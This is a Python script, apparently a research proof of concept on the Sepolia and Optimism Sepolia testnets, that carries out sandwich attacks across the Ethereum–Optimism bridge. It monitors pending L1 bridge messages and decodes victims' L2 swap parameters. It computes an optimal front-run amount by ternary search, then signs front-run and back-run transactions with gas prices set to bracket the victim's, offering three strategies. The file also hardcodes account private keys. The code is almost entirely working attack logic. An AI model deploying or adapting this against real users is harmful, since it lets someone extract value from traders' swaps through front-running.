# Optimism AMM      0x4472A443e928ed13B7c93Fd0FBB0c2905EA57791 (VolatileV1 UniswapV2 based)
# Optimism Factory  0x4A4A51e5Aa9DEC724F8e922A4C4381df60CF4b7b
# Optimism Router   0x4A2f5129892214d8381F0296606184326CeE1b12

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import math
import copy
import asyncio
import inquirer
import datetime

from web3 import Web3
from web3.gas_strategies.rpc import rpc_gas_price_strategy

from eth_abi import abi

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))

from utils.settings import *

L2_ARBITRAGE_BOT_ADDRESS    = '0x98597ad92f69BE419887EA7bBA45b1ad34cB2dab'
L2_VICTIM_BOT_ADDRESS       = '0x37eb07A1367ee1533775Aa5BdDa9F2C69D4Fd7C1'
L2_VOLATILE_PAIR_ADDRESS    = '0x4472A443e928ed13B7c93Fd0FBB0c2905EA57791'
L2_VOLATILE_ROUTER_ADDRESS  = '0x4A2f5129892214d8381F0296606184326CeE1b12'
L1_OPTIMISM_BRIDGE_ADDRESS  = '0x58Cc85b8D04EA49cC6DBd3CbFFd00B4B8D6cb3ef'
L1_HOP_BRIDGE_ADDRESS       = '0xC8A4FB931e8D77df8497790381CA7d228E68a41b'

SWAP_PERFORMED_EVENT        = '0xe4d9761ece9aad22a887c2b496caae579dc2654a9c8c0f5991ed4c9c605aa16f'


def init():
    global attacker_account, victim_account
    global web3, web3_optimism
    global l1_hop_bridge, l1_optimism_bridge, L2_volatile_pair, L2_volatile_router, l2_arbitrage_bot, l2_victim_bot

    web3          = Web3(ETHEREUM_SEPOLIA_PROVIDER)
    web3_optimism = Web3(OPTIMISM_SEPOLIA_PROVIDER)

    attacker_account = {
        'private_key': '248f86d08198ee2845230ea56d15ce7c8dac89bbe7187d012cd22b3a8c06cecb',
        'address': '0x063775c1382040c922BAD87dF7fd61a1d14717b1',
    }
    victim_account = {
        'private_key' : 'f85c7c57ad59837b2c25a9ef775e1594338994c149fa112cf3cf4f064646398a',
        'address' : '0x538B211999a70b0da47e21Cc6f49Ed0a549bEc40'
    }

    '''
        read all necessary contract ABI
    '''

    _dir = os.path.dirname(os.path.abspath(__file__))

    ''' l1_hop_bridge '''
    CONTRACT_ADDRESS = web3.to_checksum_address(L1_HOP_BRIDGE_ADDRESS)
    with open(_dir+'/abi/L1_HOP_BRIDGE_ABI.txt') as f:
        CONTRACT_ABI = f.read()
    l1_hop_bridge = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

    ''' l1_optimism_bridge '''
    CONTRACT_ADDRESS = web3.to_checksum_address(L1_OPTIMISM_BRIDGE_ADDRESS)
    with open(_dir+'/abi/L1_OPTIMISM_BRIDGE_ABI.txt') as f:
        CONTRACT_ABI = f.read()
    l1_optimism_bridge = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

    ''' l2_arbitrage_bot '''
    CONTRACT_ADDRESS = web3_optimism.to_checksum_address(L2_ARBITRAGE_BOT_ADDRESS)
    with open(_dir+'/abi/L2_ARBITRAGE_BOT_ABI.txt') as f:
        CONTRACT_ABI = f.read()
    l2_arbitrage_bot = web3_optimism.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

    ''' l2_victim_bot '''
    CONTRACT_ADDRESS = web3_optimism.to_checksum_address(L2_VICTIM_BOT_ADDRESS)
    with open(_dir+'/abi/L2_ARBITRAGE_BOT_ABI.txt') as f:
        CONTRACT_ABI = f.read()
    l2_victim_bot = web3_optimism.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

    ''' L2_volatile_pair '''
    CONTRACT_ADDRESS = web3_optimism.to_checksum_address(L2_VOLATILE_PAIR_ADDRESS)
    with open(_dir+'/abi/L2_VOLATILE_PAIR_CONTRACT_ABI.txt') as f:
        CONTRACT_ABI = f.read()
    L2_volatile_pair = web3_optimism.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

    ''' L2_volatile_router '''
    CONTRACT_ADDRESS = web3_optimism.to_checksum_address(L2_VOLATILE_ROUTER_ADDRESS)
    with open(_dir+'/abi/L2_VOLATILE_ROUTER_CONTRACT_ABI.txt') as f:
        CONTRACT_ABI = f.read()
    L2_volatile_router = web3_optimism.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

def getAmountOut(in_amount, zeroForOne, reserves):
    in_amount -= in_amount * 2 // 10000 # remove fee from amount received
    reserveA, reserveB = (reserves[0], reserves[1]) if zeroForOne else (reserves[1], reserves[0])
    out_amount = in_amount * reserveB // (reserveA + in_amount)
    return out_amount

def swap(in_amount, zeroForOne, reserves):
    fee = in_amount * 2 // 10000
    mod_in_amount = in_amount- fee # remove fee from amount received
    reserveA, reserveB = (reserves[0], reserves[1]) if zeroForOne else (reserves[1], reserves[0])
    out_amount = mod_in_amount * reserveB // (reserveA + mod_in_amount)
    if zeroForOne:
        reserves[0] += mod_in_amount
        reserves[1] -= out_amount
    else:
        reserves[1] += mod_in_amount
        reserves[0] -= out_amount
    return out_amount

def calculateSwapWithChanges(tokenIndexFrom,tokenIndexTo,in_amount,reserves):
    zeroForOne = tokenIndexFrom == 0
    return swap(in_amount,zeroForOne,reserves)

def ternarySearch(left,right,amountMin,victimIn,reserves,tokenIndexFrom,tokenIndexTo):
    if abs(left-right) <= 1 * 10**1:
        return (left+right)//2
    # calculate the thirds bounds
    left_third = (2*left+right)//3
    right_third= (left+2*right)//3

    reserves_copy_Left = copy.deepcopy(reserves)
    l           = calculateSwapWithChanges(tokenIndexFrom,tokenIndexTo,left_third,reserves_copy_Left)
    victimOutL  = calculateSwapWithChanges(tokenIndexFrom,tokenIndexTo,victimIn,reserves_copy_Left)
    profitLEFT= -math.inf
    if victimOutL >= amountMin:
        backrunFinalAmountLeft = calculateSwapWithChanges(tokenIndexTo,tokenIndexFrom,l,reserves_copy_Left)
        profitLEFT = backrunFinalAmountLeft - left_third

    reserves_copy_Right = copy.deepcopy(reserves)
    r           = calculateSwapWithChanges(tokenIndexFrom,tokenIndexTo,right_third,reserves_copy_Right)
    victimOutR  = calculateSwapWithChanges(tokenIndexFrom,tokenIndexTo,victimIn,reserves_copy_Right)
    profitRIGHT= -math.inf
    if victimOutR >= amountMin:
        backrunFinalAmountRight = calculateSwapWithChanges(tokenIndexTo,tokenIndexFrom,r,reserves_copy_Right)
        profitRIGHT = backrunFinalAmountRight - right_third

    if profitLEFT < profitRIGHT:
        return ternarySearch(left_third, right,amountMin,victimIn, reserves,tokenIndexFrom,tokenIndexTo)
    else:
        return ternarySearch(left, right_third,amountMin,victimIn, reserves,tokenIndexFrom,tokenIndexTo)

def getReserves(block_identifier='latest'):
    res = L2_volatile_pair.functions.getReserves().call(block_identifier=(block_identifier))
    return [res[0],res[1]]

def trigger():
    strategy = 3

    current_blocknumber = (web3_optimism.eth.get_block('latest'))['number']
    reserves = getReserves()

    victim_in_amount = int(1*1e18)

    optimal_input_frontrun_trx = ternarySearch(1,int(9*1e18), 0,victim_in_amount,reserves,0,1)

    if optimal_input_frontrun_trx < 10:
        return

    front_run_output_trx = calculateSwapWithChanges(0,1,optimal_input_frontrun_trx,reserves)
    simulated_victim_output_trx = calculateSwapWithChanges(0,1,victim_in_amount,reserves)
    back_run_output_trx = calculateSwapWithChanges(1,0,front_run_output_trx,reserves)

    profit_backrun = back_run_output_trx - optimal_input_frontrun_trx

    if profit_backrun < 10:
        return

    if strategy == 1:
        strategy1(optimal_input_frontrun_trx,victim_in_amount,front_run_output_trx)
    elif strategy == 2:
        strategy2(optimal_input_frontrun_trx,victim_in_amount,front_run_output_trx)
    else:
        strategy3(optimal_input_frontrun_trx,victim_in_amount,front_run_output_trx)

def strategy1(optimal_input_frontrun_trx,victim_in_amount,front_run_output_trx,victim_gas, victim_gas_price):
    msg1 = bytes.fromhex(l2_arbitrage_bot.encodeABI(fn_name='swap',args=[True,int(optimal_input_frontrun_trx),int(0)])[2:])
    msg3 = bytes.fromhex(l2_arbitrage_bot.encodeABI(fn_name='swap',args=[False,int(front_run_output_trx),int(0)])[2:])

    nonce        = web3.eth.get_transaction_count(attacker_account["address"])

    gas_price = 83718970103

    #sendmessage
    call_function = l1_optimism_bridge.functions.sendMessage(l2_arbitrage_bot.address,msg1,1000000).build_transaction(
            {"chainId": ETHEREUM_SEPOLIA_ID, "from": attacker_account["address"], "nonce": nonce, "gas":victim_gas , "gasPrice":victim_gas_price+1, "value": 0}
            )
    signed_tx_frontrun = web3.eth.account.sign_transaction(call_function, private_key=attacker_account['private_key'])

    #backrun
    nonce = nonce+1
    call_function = l1_optimism_bridge.functions.sendMessage(l2_arbitrage_bot.address,msg3,1000000).build_transaction(
            {"chainId": ETHEREUM_SEPOLIA_ID, "from": attacker_account["address"], "nonce": nonce, "gas":victim_gas , "gasPrice":victim_gas_price-1 , "value": 0}
            )
    signed_tx_backrun = web3.eth.account.sign_transaction(call_function, private_key=attacker_account['private_key'])

    send_receipt_frontrun = web3.eth.send_raw_transaction(signed_tx_frontrun.rawTransaction)
    send_tx_backrun = web3.eth.send_raw_transaction(signed_tx_backrun.rawTransaction)
    tx_receipt_frontrun = web3.eth.wait_for_transaction_receipt(send_receipt_frontrun)
    print("Frontrun Transaction was sent on L1:")
    print(f"https://sepolia.etherscan.io/tx/{tx_receipt_frontrun['transactionHash'].hex()}")

    tx_receipt_backrun = web3.eth.wait_for_transaction_receipt(send_tx_backrun)
    print("Backrun Transaction was sent on L1:")
    print(f"https://sepolia.etherscan.io/tx/{tx_receipt_backrun['transactionHash'].hex()}")

def strategy2(optimal_input_frontrun_trx,victim_in_amount,front_run_output_trx,victim_gas, victim_gas_price):
    msg1 = bytes.fromhex(l2_arbitrage_bot.encodeABI(fn_name='swap',args=[True,int(optimal_input_frontrun_trx),int(0)])[2:])

    nonce         = web3.eth.get_transaction_count(attacker_account["address"])
    nonce_optimism= web3_optimism.eth.get_transaction_count(attacker_account["address"])

    #sendmessage
    call_function = l1_optimism_bridge.functions.sendMessage(l2_arbitrage_bot.address,msg1,1000000).build_transaction(
            {"chainId": ETHEREUM_SEPOLIA_ID, "from": attacker_account["address"], "nonce": nonce, "gas":victim_gas , "gasPrice":victim_gas_price+1, "value": 0}
            )
    signed_tx_frontrun = web3.eth.account.sign_transaction(call_function, private_key=attacker_account['private_key'])

    #backrun
    call_function = l2_arbitrage_bot.functions.swap(False,front_run_output_trx,0).build_transaction(
            {"chainId": OPTIMISM_SEPOLIA_ID, "from": attacker_account["address"], "nonce": nonce_optimism, "gas":victim_gas , "gasPrice":victim_gas_price-1, "value": 0}
            )
    signed_tx_backrun = web3_optimism.eth.account.sign_transaction(call_function, private_key=attacker_account['private_key'])

    send_receipt_frontrun = web3.eth.send_raw_transaction(signed_tx_frontrun.rawTransaction)

    tx_receipt_frontrun = web3.eth.wait_for_transaction_receipt(send_receipt_frontrun)
    print("Frontrun Transaction was sent on L1:")
    print(f"https://sepolia.etherscan.io/tx/{tx_receipt_frontrun['transactionHash'].hex()}")

    # Change this to listen to HOP or the Event by the victim L2 (ReedemSchedule, RelayedMessage Event), wait for the victim
    event_filter = web3_optimism.eth.filter({'fromBlock':'latest',"topics": [SWAP_PERFORMED_EVENT]})

    while True:
        for event in event_filter.get_new_entries():
            send_tx_backrun = web3_optimism.eth.send_raw_transaction(signed_tx_backrun.rawTransaction)
            tx_receipt_backrun = web3_optimism.eth.wait_for_transaction_receipt(send_tx_backrun)
            print("Backrun Transaction was sent on L2:")
            print(f"https://sepolia-optimism.etherscan.io/tx/{tx_receipt_backrun['transactionHash'].hex()}")
            return
        time.sleep(0.1)

def strategy3(optimal_input_frontrun_trx,victim_in_amount,front_run_output_trx,victim_gas, victim_gas_price):
    nonce        = web3_optimism.eth.get_transaction_count(attacker_account["address"])
    nonce_victim = web3.eth.get_transaction_count(victim_account["address"])

    gas_price = 83718970103

    #sendmessage
    call_function = l2_arbitrage_bot.functions.swap(True,optimal_input_frontrun_trx,0).build_transaction(
            {"chainId": OPTIMISM_SEPOLIA_ID, "from": attacker_account["address"], "nonce": nonce, "gas":victim_gas , "gasPrice":victim_gas_price+1, "value": 0}
            )
    signed_tx_frontrun = web3_optimism.eth.account.sign_transaction(call_function, private_key=attacker_account['private_key'])

    #backrun
    nonce = nonce+1
    call_function = l2_arbitrage_bot.functions.swap(False,front_run_output_trx,0).build_transaction(
            {"chainId": OPTIMISM_SEPOLIA_ID, "from": attacker_account["address"], "nonce": nonce, "gas":victim_gas , "gasPrice":victim_gas_price-1, "value": 0}
            )
    signed_tx_backrun = web3_optimism.eth.account.sign_transaction(call_function, private_key=attacker_account['private_key'])

    send_receipt_frontrun = web3_optimism.eth.send_raw_transaction(signed_tx_frontrun.rawTransaction)
    tx_receipt_frontrun = web3_optimism.eth.wait_for_transaction_receipt(send_receipt_frontrun)
    print("Frontrun Transaction was sent on L2")
    print(f"https://sepolia-optimism.etherscan.io/tx/{tx_receipt_frontrun['transactionHash'].hex()}")

    # Change this to listen to HOP or the Event by the victim L2 (ReedemSchedule, RelayedMessage Event), wait for the victim
    event_filter = web3_optimism.eth.filter({'fromBlock':'latest',"topics": [SWAP_PERFORMED_EVENT]})

    while True:
        for event in event_filter.get_new_entries():
            send_tx_backrun = web3_optimism.eth.send_raw_transaction(signed_tx_backrun.rawTransaction)
            tx_receipt_backrun = web3_optimism.eth.wait_for_transaction_receipt(send_tx_backrun)
            print("Backrun Transaction was sent on L2")
            print(f"https://sepolia-optimism.etherscan.io/tx/{tx_receipt_backrun['transactionHash'].hex()}")
            return
        time.sleep(0.1)

def calculate_profitable(victim_in_amount, victim_min_amount, budget, zero_for_one):
    from_index, to_index = (1,0) if not zero_for_one else (0,1)
    current_reserves = getReserves()
    optimal_input_frontrun_trx = ternarySearch(1,budget, victim_min_amount ,victim_in_amount,current_reserves,from_index,to_index)

    if optimal_input_frontrun_trx < 10:
        return -1,-1,-1

    front_run_output_trx =        calculateSwapWithChanges(from_index,to_index,optimal_input_frontrun_trx,current_reserves)
    simulated_victim_output_trx = calculateSwapWithChanges(from_index,to_index,victim_in_amount,current_reserves)
    back_run_output_trx =         calculateSwapWithChanges(to_index, from_index, front_run_output_trx,current_reserves)

    profit_backrun = back_run_output_trx - optimal_input_frontrun_trx

    if profit_backrun < 10:
        return -1,-1,-1

    return profit_backrun, optimal_input_frontrun_trx, front_run_output_trx

def send_victim_transction(victim_in_amount):
    msg2 = bytes.fromhex(l2_victim_bot.encodeABI(fn_name='swap',args=[True,int(victim_in_amount),int(0)])[2:])
    nonce_victim = web3.eth.get_transaction_count(victim_account["address"])
    gas_price = 83718970102

    # sendmessage for the victim
    call_function = l1_optimism_bridge.functions.sendMessage(l2_victim_bot.address,msg2,1000000).build_transaction(
            {"chainId": ETHEREUM_SEPOLIA_ID, "from": victim_account["address"], "nonce": nonce_victim, "gas":5000000 , "gasPrice":gas_price, "value": 0}
            )
    signed_tx_victim = web3.eth.account.sign_transaction(call_function, private_key=victim_account['private_key'])

    send_tx_victim = web3.eth.send_raw_transaction(signed_tx_victim.rawTransaction)

    print("Victim Transaction was sent on L1: ")
    print(f"https://sepolia.etherscan.io/tx/{send_tx_victim.hex()}")

def analyze_l1_pending_transaction(strategy, event = {}):
    try:
        transaction_hash = Web3.to_json(event).strip('"')
        transaction = web3.eth.get_transaction(transaction_hash)

        if transaction['from'] == attacker_account["address"]:
            return

        if not transaction["to"] == L1_OPTIMISM_BRIDGE_ADDRESS:
            return

        victim_gas = transaction["gas"]
        victim_gas_price = transaction["gasPrice"]
        data = transaction["input"]
        # first 8 Bytes are the function signature. We want to check for the signature of requestL2Transaction
        # --> 0xeb672419
        function_signature = data[2:10]

        if not function_signature == '3dbb202b':
            return

        print(f"Found transaction triggering the L1 Optimism Bridge withb hash: {transaction_hash}")

        #now we need to decode the actual input:
        #sendMessage(
            # address _target,
            # bytes _message, <<-- This is interesting
            # uint32 _minGasLimit

        # we actually know which function signature we are looking for
        # this part is mostly manualy work, but can be automated by the detection scripts, extracting the function calls
        # from the data gathered, in this case we know the signature to look out for is 0x08c84c21
        # we will use the find() function to find if the instance is in the data. Afterwards we read the fields in the msg

        start_index = data.find("08c84c21") # offset this value by 8 to get rid of signature

        if start_index == -1: #not found
            print(f"No swap induced on L2")
            return

        print(f"This transaction induces a swap on L2")

        # decode input fields:
        zero_for_one = bool(int(data[start_index+8:start_index+8+64]))
        amount_in    = int(data[start_index+8+1*64 :start_index+8+2*64],16)
        amount_min   = int(data[start_index+8+2*64:start_index+8+3*64],16)

        # we now calculate if an attack is even possible and profitable
        profit_backrun, optimal_input_frontrun_trx, front_run_output_trx = calculate_profitable(amount_in,amount_min,attacker_budget,zero_for_one)

        if profit_backrun == -1 or optimal_input_frontrun_trx == -1 or front_run_output_trx == -1:
            print(f"Not profitable to sandwich")
            return

        print(f"This transaction induces a swap on L2 which is profitable for the attacker with potential profit of {profit_backrun/(1e18)} ETH")
        print(f"Executing strategy: {strategy}")

        if strategy == 1:
            strategy1(optimal_input_frontrun_trx,amount_in,front_run_output_trx,victim_gas,victim_gas_price)
        elif strategy == 2:
            strategy2(optimal_input_frontrun_trx,amount_in,front_run_output_trx,victim_gas,victim_gas_price)
        else:
            strategy3(optimal_input_frontrun_trx,amount_in,front_run_output_trx,victim_gas,victim_gas_price)

        # we did our job now!
        return

    except Exception as err:
        print(f'error: {err}')

async def log_loop(event_filter, poll_interval, strategy):
    while True:
        events = event_filter.get_new_entries()
        for event in events:
            analyze_l1_pending_transaction(strategy,event)
        await asyncio.sleep(poll_interval)

def main():
    # filter for pending transactions
    global attacker_budget

    print()
    print()

    init()

    questions = [
        inquirer.Text("budget", message="Please enter budget in WEI", validate=lambda _, x: x.isnumeric()),
        inquirer.List("strategy", message="Which Strategy do you want to use for you attacks?", choices=["S1", "S2", "S3"], default="S1"),
    ]

    answers = inquirer.prompt(questions)

    attacker_budget = int(answers['budget']) # 5 ETH
    strategy = 1 if answers['strategy'] == "S1" else 2 if answers['strategy'] == "S2" else 3
    victim_in_amount = int(0.5*1e18) # 0.01 ETH

    print()

    tx_filter = web3.eth.filter('pending')
    loop = asyncio.get_event_loop()

    send_victim_transction(victim_in_amount)

    try:
        loop.run_until_complete(
            asyncio.gather(
                log_loop(tx_filter, 0.01,strategy)))
    finally:
        loop.close()

if __name__ == '__main__':
    main()
